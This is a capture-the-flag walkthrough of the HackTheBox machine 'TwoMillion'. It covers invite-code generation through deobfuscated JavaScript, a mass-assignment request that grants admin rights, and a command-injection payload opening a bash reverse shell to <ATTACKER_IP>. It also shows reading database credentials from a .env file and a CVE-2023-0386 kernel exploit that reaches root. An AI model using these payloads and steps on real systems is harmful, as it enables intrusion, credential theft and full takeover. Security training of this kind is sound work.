---
title: "TwoMillion"
date: 2026-06-27
categories: [HackTheBox, Easy]
tags: [linux, nginx, javascript deobfuscation, dean edwards packer, rot13, base64, API enumeration, mass assignment, command injection, credential reuse, CVE-2023-0386, OverlayFS, FUSE, kernel exploit]
image:
  path: /assets/img/HTB/TwoMillion/banner.png
  alt: TwoMillion writeup
---


Custom-coded application protecting registration behind a "secret" invite system whose code is hidden in a Dean-Edwards-packed JavaScript file; deobfuscation reveals an unauthenticated `/api/v1/invite/how/to/generate` endpoint returning ROT13-encoded instructions to call `/api/v1/invite/generate`, which yields a base64-encoded valid invite. Once registered, an unauthenticated `/api/v1` route catalogue exposes the full admin API; a **mass-assignment** flaw in `PUT /api/v1/admin/settings/update` lets any authenticated user set `is_admin: 1` on their own account, and the now-accessible `POST /api/v1/admin/vpn/generate` is vulnerable to **command injection** through its `username` parameter, yielding a reverse shell as `www-data`. Lateral movement to the `admin` OS user via DB credentials reused from `/var/www/html/.env`; privilege escalation via **CVE-2023-0386**, an OverlayFS/FUSE kernel flaw that grants setuid execution of a FUSE-hosted binary as root.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Easy                |
| OS         | Linux               |
| IP         | 10.129.229.66       |
| Date       | June 2026           |

## Tools Used

| Tool             | Description                                                                       |
|------------------|-----------------------------------------------------------------------------------|
| nmap             | Network port scanner and service fingerprinter                                    |
| Browser DevTools | JavaScript inspection and Dean Edwards packer deobfuscation                       |
| curl             | Raw API interaction during the invite generation chain                            |
| Python 3         | ROT13 decoding helper                                                             |
| Burp Suite       | Crafting the mass-assignment and command-injection payloads                       |
| netcat (nc)      | Reverse-shell listener for the command-injection foothold                         |
| su               | Lateral move with the reused DB credential                                        |
| Python http.server | Serving the kernel-exploit zip to the target                                    |
| make / gcc       | Compiling the CVE-2023-0386 PoC inside the target                                 |

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify the application stack worth attacking.

### Host Discovery

Reachability and an OS hint via ICMP:

```bash
ping -c 1 10.129.229.66
PING 10.129.229.66 (10.129.229.66) 56(84) bytes of data.
64 bytes from 10.129.229.66: icmp_seq=1 ttl=63 time=47.7 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

### Port Scan

A SYN scan across all 65535 TCP ports at a high packet rate, followed by targeted version detection:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.229.66 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
sudo nmap -p22,80 -sCV 10.129.229.66 -oN nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

Two ports — SSH and HTTP. OpenSSH 8.9p1 is current and unlikely to be a direct entry point; HTTP became the focus. The redirect to `2million.htb` confirmed name-based virtual hosting, so the domain was added to `/etc/hosts`:

```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

### Web Application

Browsing to `http://2million.htb/` loaded the marketing site for the historical HackTheBox "2 million users" celebration page. The interesting element was the **/invite** route, which presented a registration form gated by an invite code. No code in hand, no obvious way to request one — which meant the invite-issuing mechanism had to be somewhere on the client side.

Inspecting the page source revealed a suspicious JavaScript file:

```bash
curl -s http://2million.htb/js/inviteapi.min.js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

The signature `eval(function(p,a,c,k,e,d){...})` identifies this as **Dean Edwards' "Packer"** — a JavaScript minifier from 2007 that turns readable code into a single-line `eval()` call. It's not encryption; it's a string-substitution scheme that the runtime undoes immediately at `eval()` time, and any developer console can recover the original by replacing `eval` with `console.log`. The deobfuscated source:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response); },
        error:   function(response) { console.log(response); }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response); },
        error:   function(response) { console.log(response); }
    });
}
```

Two functions, both pointing at a `/api/v1/invite/` namespace. The `makeInviteCode()` function is the giveaway — the application explicitly exposes an endpoint that *tells you how to make an invite code*, presumably the entry point for newly-onboarded administrators that nobody remembered to gate behind authentication.

## Exploitation

### Invite-code generation chain — JS deobfuscation → ROT13 → base64

Hitting the "how to generate" endpoint directly returned a hint:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

The response is internally consistent in a delightfully self-defeating way: it labels the encoding as **`ROT13`** in the `enctype` field, advertises that the payload is "encrypted", and includes a hint suggesting the reader "check the encryption type" — which the server has just disclosed. ROT13 is the trivial Caesar cipher with shift 13, symmetric in its own right (encoding twice returns the original), and any text routine can reverse it:

```python
import codecs
texto_cifrado = "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
print(codecs.decode(texto_cifrado, 'rot_13'))
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

The decoded instruction is itself just another unauthenticated endpoint. Calling it returns the code:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"N1FPREstVVNVTkEtQ04wNUstQ1BJS0s=","format":"encoded"}}
```

The `format: encoded` field is the second hint — base64 in this case:

```bash
echo "N1FPREstVVNVTkEtQ04wNUstQ1BJS0s=" | base64 -d
7QODK-USUNA-CN05K-CPIKK
```

A valid invite code, used to register a new account through the standard form:

![Registration form populated with the recovered invite code](/assets/img/HTB/TwoMillion/cap1.png)

### API enumeration — `/api/v1` route catalogue

A logged-in session opens a much larger attack surface, but the next finding was more interesting still. The application exposes a route catalogue at `/api/v1`:

```bash
curl -s http://2million.htb/api/v1
{
  "v1": {
    "user": {
      "GET":  { "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate":        "Generate invite code",
                "/api/v1/invite/verify":          "Verify invite code",
                "/api/v1/user/auth":              "Check if user is authenticated",
                "/api/v1/user/vpn/generate":      "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate":    "Regenerate VPN configuration",
                "/api/v1/user/vpn/download":      "Download OVPN file" },
      "POST": { "/api/v1/user/register":          "Register a new user",
                "/api/v1/user/login":             "Login with existing user" }
    },
    "admin": {
      "GET":  { "/api/v1/admin/auth":             "Check if user is admin" },
      "POST": { "/api/v1/admin/vpn/generate":     "Generate VPN for specific user" },
      "PUT":  { "/api/v1/admin/settings/update":  "Update user settings" }
    }
  }
}
```

Three administrative endpoints. The `PUT /api/v1/admin/settings/update` route is the obvious target for privilege escalation — anything called "update settings" that an admin can use will involve writing user-controlled values into a user record. If the implementation is naïve, it might also let a regular user write fields they shouldn't be able to.

### Mass-assignment in `/api/v1/admin/settings/update`

**Mass-assignment** is a classical web vulnerability where an endpoint accepts a JSON body and blindly copies every field from the request into a backend object — without filtering which fields are user-modifiable. In an "update settings" endpoint, the developer expects the user to send `{"email": "..."}` and updates the email. But if the backend just iterates over the JSON keys and assigns each one to the corresponding column in the `users` table, anything with a column name — including `is_admin`, `is_verified`, `password_hash` — becomes attacker-controlled.

The first probe established the endpoint's input-validation behaviour. Sending a PUT with `Content-Type: application/x-www-form-urlencoded` failed at the first gate:

![Burp request with form Content-Type returning Invalid content type](/assets/img/HTB/TwoMillion/cap2.png)

The response (`Invalid content type`) is itself an information leak — the endpoint expects JSON. Sending an empty JSON body confirmed the next gate:

![Burp request with empty JSON body returning Missing parameter: email](/assets/img/HTB/TwoMillion/cap3.png)

`Missing parameter: email`. The endpoint requires `email`. Adding a valid email but with a malformed body (trailing comma) still tripped the parse / parameter check.

The decisive request added both `email` and the unauthorised `is_admin: 1` field:

![Burp request with email and is_admin:1 returning a successful user record with is_admin:1](/assets/img/HTB/TwoMillion/cap4.png)

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=ani347blobjh3dd9pebhu3h1o7

{"email":"monre@monre.com","is_admin":1}

HTTP/1.1 200 OK
{"id":14,"username":"monre","is_admin":1}
```

The response is the smoking gun — the server returned the updated user record showing `is_admin: 1`. The endpoint's complete failure to filter writable fields meant any authenticated user could grant themselves administrative rights with one PUT request.

Confirmation came from a different endpoint, the admin-status check:

![GET /api/v1/admin/auth returning message:true confirming admin role](/assets/img/HTB/TwoMillion/cap5.png)

```http
GET /api/v1/admin/auth?user=monre@monre.com HTTP/1.1
...
HTTP/1.1 200 OK
{"message":true}
```

Now the previously-gated admin endpoints were reachable, including `POST /api/v1/admin/vpn/generate`.

### Command injection in `/api/v1/admin/vpn/generate`

The VPN generation endpoint exists to issue OpenVPN configurations for arbitrary users — a feature an admin would legitimately use to onboard new operators. The first probe revealed the expected parameter:

![Empty POST returning Missing parameter: username](/assets/img/HTB/TwoMillion/cap6.png)

A valid call returned an OpenVPN client config:

![POST with username returning a full OpenVPN configuration file](/assets/img/HTB/TwoMillion/cap7.png)

The presence of a full `client.ovpn` in the response — with `<ca>`, `<cert>`, `<key>` blocks, cipher suites, and remote endpoints — is itself a strong signal. The application is almost certainly **shelling out** to OpenVPN's userspace tooling (something like `easyrsa build-client-full $username` or a custom wrapper script) and capturing the resulting config file from disk. Any time the backend invokes a shell with user input as part of the command line, **command injection** is the default suspicion.

The standard Bash shell-substitution payload — `$(command)` — is interpreted by the shell during command construction, so anything the substituted command emits gets folded into the final command line. For a reverse shell, the substituted command doesn't need to *emit* anything; it just needs to *execute* the shell-spawning logic as a side effect:

A netcat listener was started on the attacker box:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

The injection payload was placed inside the `username` field:

![Burp request with $(bash -c '...') payload inside the username JSON value](/assets/img/HTB/TwoMillion/cap8.png)

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=ani347blobjh3dd9pebhu3h1o7

{"username":"$(bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1')"}
```

The listener caught the callback as `www-data`:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.66 54966
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Lateral Movement — `www-data` → `admin`

The reflex check after any shell on a PHP/Laravel-style stack is to read the application's `.env` file in the web root. Frameworks of that family load `.env` at boot and stuff every line into runtime configuration, which means it routinely contains database credentials, API keys, and signing secrets — all in plaintext, all readable by the web server user:

```bash
cat /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The database user is named `admin`, and there's a system user named `admin` visible in `/etc/passwd`. The standard credential-reuse hypothesis — that the operator who set up the database used the same password for the OS account — was tested directly with `su`:

```bash
su admin
Password: SuperDuperPass123
admin@2million:/var/www/html$ cd && cat user.txt
```

This is the foothold proper. `admin` is the user holding `user.txt`.

## Privilege Escalation — `admin` → `root` (CVE-2023-0386)

The standard enumeration as `admin` came back empty: `sudo -l` returned nothing useful, no SUID anomalies surfaced, no writable cron-touched files. The breakthrough came from a less-obvious place — the user's mail spool:

```bash
cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Subject: Urgent: Patch System OS

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're
partially down, can you also upgrade the OS on our web host? There have been a
few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE
looks nasty. We can't get popped by that.

HTB Godfather
```

The email is a deliberate hint: there's a serious **OverlayFS / FUSE** kernel CVE the admin hasn't yet patched. Checking the running kernel:

```bash
uname -r
5.15.70-051570-generic
```

Kernel 5.15.70 — well within the vulnerable range for **CVE-2023-0386**, published in early 2023 and affecting Linux kernels prior to 6.2.

### Understanding CVE-2023-0386

The Linux kernel's **OverlayFS** is the union-mount filesystem that lets Docker, AppImage, and similar systems layer a writable "upper" filesystem on top of a read-only "lower" one. **FUSE** ("Filesystem in Userspace") lets unprivileged users mount filesystems whose contents are served by a regular userspace process.

The bug lives in the interaction between these two: when a file is copied from the lower layer to the upper layer (the standard "copy-up" operation that happens on first write), the kernel preserves the file's **setuid bit** — even when the lower layer is a FUSE filesystem the unprivileged user controls. Normally, FUSE filesystems have `nosuid` enforced at mount time so that a malicious FUSE-served binary can't have setuid honoured. But the OverlayFS copy-up bypasses that enforcement: it copies the file with setuid intact into a real filesystem (`tmpfs` or similar) where setuid *is* honoured, and the resulting file can be executed as root.

The exploit chain is therefore:

1. Mount a FUSE filesystem under the user's control, serving a binary whose owner is reported as `root` and whose mode includes setuid.
2. Mount an OverlayFS with that FUSE filesystem as the lower layer.
3. Trigger a copy-up on the binary (any write attempt suffices).
4. Execute the copied binary — it now has setuid honoured because it lives in a real filesystem.
5. The binary's `setuid(0)` plus `execve("/bin/bash")` produces a root shell.

The public PoC by `sxlmnwb` (`CVE-2023-0386` on GitHub) implements exactly this flow, split across three binaries:
- `fuse` — the userspace FUSE server that publishes the malicious binary
- `gc` (getshell.c) — the setuid binary that does the privilege transition
- `exp` — the OverlayFS mount + trigger

### Compilation and Exploitation

The PoC was cloned on the attacker host and zipped for delivery:

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386.git
zip -r CVE-2023-0386.zip CVE-2023-0386
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Fetched from the target and unpacked:

```bash
wget http://<ATTACKER_IP>:8000/CVE-2023-0386.zip
unzip CVE-2023-0386.zip
cd CVE-2023-0386
```

Built locally on the target (the Makefile produces the three binaries in one step):

```bash
make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

The exploit needs two terminals running concurrently. The first launches the FUSE filesystem and keeps it mounted:

```bash
./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
```

In a second terminal (a fresh `su admin` session), the OverlayFS mount + trigger:

```bash
./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 27 13:10 .
drwxrwxr-x 6 root   root     4096 Jun 27 13:10 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
root@2million:~/CVE-2023-0386# whoami
root
root@2million:~/CVE-2023-0386# cat /root/root.txt
```

The `-rwsrwxrwx` permissions on the file (with the `s` in the owner slot) confirm setuid was preserved across the copy-up — that's the bug, visible at the filesystem layer. Executing the file with `setuid(0)` baked in is what flipped the EUID to 0.

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Client-side obfuscation is not security.** Dean Edwards' packer was a minifier in 2007 and a curiosity by 2010; treating it as access control in 2023 is a category error. Any code path whose security depends on the client not reading its own JavaScript is broken by construction. The same applies to JS minification, source-map stripping, and worker-bundled API URLs — all of them are recoverable by any motivated reader.
- **"Encryption type: ROT13"** is the canonical example of confusing **encoding** with **encryption**. Encoding is reversible by anyone (base64, hex, URL-encoding, ROT13); encryption requires a key the attacker shouldn't have. The TwoMillion API not only used ROT13 but *labelled it as such in the response*, which collapses any pretence of an obstacle. Always assume any obfuscation that doesn't require a secret is reversible in seconds.
- **`/api/v1` route catalogues are a self-service attack-surface document.** Discoverability is a developer convenience that becomes an attacker convenience when shipped to production. Public route listings should never include privileged endpoints, even if those endpoints are themselves authenticated — they tell the attacker exactly which doors to try.
- **Mass-assignment is the canonical "trust the wrong layer" web bug.** The fix is at the model layer (allowlist explicitly which fields the request body can write — Rails calls this `permit_params`, Laravel calls it `$fillable`), not at the validation layer. A controller that filters input is a per-route mitigation; a model that restricts assignment is structural. Endpoints with `is_admin` writable from a user-controlled JSON body almost always indicate the model layer was bypassed entirely.
- **Shell interpolation of user input is direct RCE.** Any code path that builds a shell command line from request parameters — even if the parameter is "just a username" — is one `$(...)` away from arbitrary execution. The correct fix is to use `execve`-style APIs that take an argv array, bypassing shell parsing entirely. The wrong fix is to escape the input; escapes get the encoding rules wrong eventually and the bug returns.
- **`.env` files in document roots are pre-authentication credential disclosure waiting to happen.** Even when not directly served (most webservers refuse to serve dotfiles), they're readable by every process running as the web server user — which means any code-execution vulnerability immediately leaks them. The credentials inside are routinely reused across the database, internal services, and OS accounts. Production secrets belong in a secret manager (Vault, AWS Secrets Manager, Kubernetes secrets), not in a file sharing a directory with PHP scripts.
- **Kernel patching is the last layer of defence and the most often deferred.** A 2023 kernel CVE still exploitable in mid-2026 is the kind of finding that turns a contained web compromise into a full root takeover. Out-of-band reminders ("please patch the OS") are not a substitute for unattended-upgrades or equivalent. Any host that runs internet-facing services should have its kernel auto-patched, and `uname -r` should be a routine post-exploitation enumeration step precisely because the answer is so often "no, it's not patched".
